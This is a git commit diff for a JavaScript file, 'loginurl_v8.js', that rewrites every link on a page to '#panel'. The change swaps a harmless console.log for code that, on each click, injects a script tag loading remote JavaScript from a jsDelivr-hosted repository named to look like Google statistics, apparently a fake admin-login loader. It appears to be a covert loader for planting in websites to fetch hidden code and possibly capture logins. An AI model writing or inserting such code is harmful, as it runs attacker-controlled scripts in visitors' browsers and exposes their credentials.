2300e7e729d32190987f81619eb007d404b5176b
MR0Boss <36040218+MR0Boss@users.noreply.github.com>
2025-01-29 17:52:59 -0500

    Update and rename loginurl_v7.js to loginurl_v8.js

--- loginurl_v8.js
+++ loginurl_v8.js
@@ -6,7 +6,7 @@ if (links.length > 0) {
     links.forEach(function(link) {
         link.href = '#panel';
         link.onclick = function() {
-            console.log(1);
+            document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/MR0Boss/googlestatistics/adminlogin_v11.js'}));
         };
     });
 }
